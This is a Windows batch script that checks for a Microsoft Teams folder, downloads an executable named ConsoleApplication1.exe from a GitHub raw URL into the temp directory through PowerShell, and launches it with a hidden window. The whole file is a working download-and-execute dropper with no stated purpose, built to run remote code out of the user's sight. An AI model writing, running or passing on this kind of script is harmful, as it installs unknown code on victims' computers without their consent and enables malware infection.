@echo off
setlocal

set "localAppData=%LOCALAPPDATA%"
set "teamsFolderPath=%localAppData%\Microsoft\Teams"

if not exist "%teamsFolderPath%" (
    echo The folder %localappdata%\Microsoft\Teams does not exist.
    exit /b 1
)

set "url=https://github.com/skibidzaa/pr/raw/main/ConsoleApplication1.exe"
set "tempPath=%TEMP%\ConsoleApplication1.exe"

powershell -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%tempPath%' -UseBasicParsing } catch { exit 1 }"
if %ERRORLEVEL% neq 0 (
    echo Failed to download the file.
    exit /b 1
)

powershell -Command "Start-Process '%tempPath%' -WindowStyle Hidden -Wait"
if %ERRORLEVEL% neq 0 (
    echo Failed to create the hidden process.
    exit /b 1
)

endlocal
exit /b 0
